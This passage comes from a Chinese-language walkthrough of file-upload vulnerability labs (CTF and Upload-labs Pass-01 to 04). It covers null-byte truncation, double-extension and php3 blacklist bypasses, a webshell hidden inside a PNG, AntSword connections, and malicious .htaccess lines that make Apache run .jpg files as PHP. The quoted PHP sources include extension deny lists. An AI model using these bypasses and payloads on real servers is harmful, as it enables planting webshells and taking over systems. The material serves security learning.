<li>第一个是尝试修改后缀名为php时 上传的文件 可以看到这个文件的php被滤过了，否则上传的应该是Super_Moose.<strong>php</strong></li>
<li>第三个文件则是通过双写绕过上传的php文件 (原本上传的Super_Moose.p<strong>php</strong>hp)</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160040274.png" alt="image-20240309160040274"></p>
<ul>
<li>最后在目录中找到flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309160057825.png" alt="image-20240309160057825"></p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="*00截断"></a>*00截断</h3><ul>
<li>了解一下00截断原理</li>
<li>00代表结束符,所以会把00后面的所有字符都截断</li>
<li>用**%00**就可以实现php文件的正常执行</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153853348.png" alt="image-20240309153853348"></p>
<ul>
<li>上传一个jpg类型的木马 并抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153858472.png" alt="image-20240309153858472"></p>
<ul>
<li>可以看到抓包后页面如下:</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153905616.png" alt="image-20240309153905616"></p>
<ul>
<li>那么我们需要怎么做呢：</li>
<li>只需在post请求中加上“文件名**.php%00**”</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153917580.png" alt="image-20240309153917580"></p>
<ul>
<li>这样子就上传过去的就是php类型的文件了！</li>
<li>访问一下试试</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153921487.png" alt="image-20240309153921487"></p>
<ul>
<li>连接成功！</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153923308.png" alt="image-20240309153923308"></p>
<ul>
<li>可以看到，我们上传过去的Super_Moose.jpg变成了Super_Moose.php</li>
<li>这是因为%00对后面的内容就进行了拦截 就只剩下前面的**.php**了</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309153925432.png" alt="image-20240309153925432"></p>
<ul>
<li>获得flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309142844389.png" alt="image-20240309142844389"></p>
<h3 id="文件头检查"><a href="#文件头检查" class="headerlink" title="**文件头检查"></a>**文件头检查</h3><p>所谓<strong>文件头检查</strong>，就是检查<strong>图片文件</strong>的头部中特有的信息</p>
<p>我们可以：</p>
<ol>
<li>在木马前加入一行代表图片的文件头信息</li>
<li>或者上传一个图片，然后在图片里植入木马</li>
</ol>
<p>这里我用第二种方法进行演示：</p>
<ul>
<li><strong>首先呢 我们需要制作一个最简单的png图片（真正的正经图片 not木马）</strong></li>
<li><strong>用电脑自带的画图工具画一下 然后保存成png格式就可以了</strong></li>
<li><strong>接下来上传这个png图片 并用BurpSuite抓包如下：</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192458670.png" alt="image-20240309192458670"></p>
<ul>
<li><strong>拦截下来 这些都是图片的编码</strong> </li>
<li><strong>我们找到图片文件的最后一段</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192503048.png" alt="image-20240309192503048"></p>
<ul>
<li><strong>第一步：在这个地方加上一句话木马（回不回车都行）</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192507142.png" alt="image-20240309192507142"></p>
<ul>
<li><strong>第二步：将后缀名png改为php</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192510342.png" alt="image-20240309192510342"></p>
<ul>
<li>修改如下：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192514040.png" alt="image-20240309192514040"></p>
<ul>
<li><strong>点击发送 发现文件成功上传</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192515996.png" alt="image-20240309192515996"></p>
<ul>
<li><strong>复制相对路径 copy</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192531404.png" alt="image-20240309192531404"></p>
<ul>
<li><strong>连接蚁剑 成功连接！</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192652524.png" alt="image-20240309192652524"></p>
<ul>
<li><strong>在这边可以看到我们上传的php文件</strong></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192655508.png" alt="image-20240309192655508"></p>
<ul>
<li>找到flag所在路径</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192702559.png" alt="image-20240309192702559"></p>
<ul>
<li>获取flag</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240309192704914.png" alt="image-20240309192704914"></p>
<h2 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h2><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><ul>
<li>进入靶场注意到右上角可以查看源代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319222404850.png" alt="image-20240319222404850"></p>
<ul>
<li>看一下源码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319222424474.png" alt="image-20240319222424474"></p>
<ul>
<li>简单的前端校验绕过</li>
<li>把一个一句话木马后缀名php先改成jpg，进行抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319223756676.png" alt="image-20240319223756676"></p>
<ul>
<li>将后缀名jpg改回php</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319223901556.png" alt="image-20240319223901556"></p>
<ul>
<li><p>可以看到现在文件可以成功上传了</p>
</li>
<li><p>尝试连接蚁剑</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319224140030.png" alt="image-20240319224140030"></p>
<ul>
<li>成功连接，添加数据</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319224559028.png" alt="image-20240319224559028"></p>
<p><strong>Tips</strong></p>
<p>如果文件上传上传之后找不到文件路径怎么办？</p>
<ul>
<li>我们可以在原页面查看源代码</li>
<li>在源代码中搜索我们上传的文件</li>
<li>即可得到文件路径</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319224904939.png" alt="image-20240319224904939"></p>
<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><ul>
<li>查看源代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225019832.png" alt="image-20240319225019832"></p>
<ul>
<li>可以看到 为mine类型</li>
</ul>
<p>用同样的方法即可</p>
<ul>
<li>先抓包</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225245826.png" alt="image-20240319225245826"></p>
<ul>
<li>注意到这里的mime类型以及是jpg格式</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225320854.png" alt="image-20240319225320854"></p>
<ul>
<li>因此识别通过，可以绕过验证</li>
<li>把后缀名改回php即可解析</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225446805.png" alt="image-20240319225446805"></p>
<ul>
<li>连接蚁剑</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225634724.png" alt="image-20240319225634724"></p>
<ul>
<li>成功添加</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319225710725.png" alt="image-20240319225710725"></p>
<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><ul>
<li>查看源代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319230045007.png" alt="image-20240319230045007"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>定义变量：<ul>
<li><code>$is_upload</code> 是一个布尔变量，用于表示文件是否成功上传，默认为 <code>false</code>。</li>
<li><code>$msg</code> 是一个字符串变量，用于存储上传过程中的消息，默认为 <code>null</code>。</li>
</ul>
</li>
<li>检查是否提交了表单：<ul>
<li>使用 <code>isset()</code> 函数检查是否存在名为 <code>submit</code> 的 POST 参数，以确定是否提交了表单。</li>
</ul>
</li>
<li>检查上传路径是否存在：<ul>
<li>使用 <code>file_exists()</code> 函数检查上传路径是否存在，其中 <code>UPLOAD_PATH</code> 是一个常量，表示上传文件的目标路径。</li>
<li>如果上传路径不存在，则将错误消息存储在 <code>$msg</code> 变量中。</li>
</ul>
</li>
<li>检查文件后缀名：<ul>
<li>定义了一个名为 <code>$deny_ext</code> 的数组，包含不允许上传的文件后缀名（<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>）。</li>
<li>获取上传文件的原始文件名，并使用 <code>trim()</code> 函数去除文件名末尾的空格。</li>
<li>使用 <code>strrchr()</code> 函数获取文件名中的后缀名（包括点）。</li>
<li>使用 <code>strtolower()</code> 函数将后缀名转换为小写。</li>
<li>使用 <code>str_ireplace()</code> 函数去除后缀名中的字符串 <code>::$DATA</code>（如果存在）。</li>
<li>使用 <code>trim()</code> 函数去除后缀名首尾的空格，并将结果存储在 <code>$file_ext</code> 变量中。</li>
</ul>
</li>
<li>检查文件后缀名是否允许上传：<ul>
<li>使用 <code>in_array()</code> 函数检查 <code>$file_ext</code> 是否存在于 <code>$deny_ext</code> 数组中。</li>
<li>如果 <code>$file_ext</code> 不在 <code>$deny_ext</code> 数组中，则继续执行下面的代码。</li>
</ul>
</li>
<li>处理上传文件：<ul>
<li>获取上传文件的临时文件路径，存储在 <code>$temp_file</code> 变量中。</li>
<li>构造目标文件的路径，包括上传路径、当前日期时间和一个随机数，并将后缀名添加到文件名中，存储在 <code>$img_path</code> 变量中。</li>
<li>使用 <code>move_uploaded_file()</code> 函数将临时文件移动到目标路径。</li>
<li>如果移动文件成功，则将 <code>$is_upload</code> 设置为 <code>true</code>，表示文件成功上传。</li>
<li>如果移动文件失败，则将错误消息存储在 <code>$msg</code> 变量中。</li>
</ul>
</li>
<li>处理不允许上传的文件后缀名：<ul>
<li>如果 <code>$file_ext</code> 存在于 <code>$deny_ext</code> 数组中，则将错误消息存储在 <code>$msg</code> 变量中。</li>
</ul>
</li>
<li>处理上传路径不存在的情况：<ul>
<li>如果上传路径不存在，则将错误消息存储在 <code>$msg</code> 变量中，提醒用户手动创建上传路径。</li>
</ul>
</li>
</ol>
<ul>
<li>可见为简单的黑名单过滤</li>
<li>我们抓包后将后缀名改为<code>php3</code>绕过</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319230502063.png" alt="image-20240319230502063"></p>
<ul>
<li>由于<code>php</code>被列为黑名单，于是改为<code>php3</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319230541959.png" alt="image-20240319230541959"></p>
<ul>
<li>成功上传</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319230552135.png" alt="image-20240319230552135"></p>
<ul>
<li>尝试连接蚁剑</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240319230954238.png" alt="image-20240319230954238"></p>
<ul>
<li><p>报错，回看源代码</p>
</li>
<li><p><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code> 文件路径被重新命名</p>
</li>
<li><p>我们可以在网页源代码中找到重命名后的文件路径</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240326083427899.png" alt="image-20240326083427899"></p>
<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><ul>
<li>先来看一下源代码</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20240321121109527.png" alt="image-20240321121109527"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>典型的黑名单绕过</li>
<li>下面采用多种方式来绕过这一题</li>
</ul>
<h4 id="hatccess"><a href="#hatccess" class="headerlink" title=".hatccess"></a>.hatccess</h4><ul>
<li>只要黑名单中没有将<code>.htaccess</code>的后缀名过滤掉，就能使用这种文件进行攻击</li>
<li>原理其实就是通过上传恶意构造的<code>.htaccess``文件</code>,从而修改apache的配置，使得apache在解析特定后缀名的文件时 会当成其他后缀文件类型来解析</li>
</ul>
<hr>
<ul>
<li>这种文件是apache的一种配置文件，包含三行代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>注记：</p>
<ul>
<li>第一行<code>&quot;&quot;</code>内留空表示上传给<strong>apache</strong>任意的文件类型，都如下操作：</li>
<li>当成<strong>php</strong>文件来解析，至这是第二行<code>php</code>的效果</li>
</ul>
<hr>
<p>不过 其实只写这样一行就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>意思是把jpg文件当成php文件解析</li>
</ul>
<p>下面我们来具体操作一下：</p>
<ul>
<li>先上传一个jpg为后缀的一句话木马</li>
</ul>
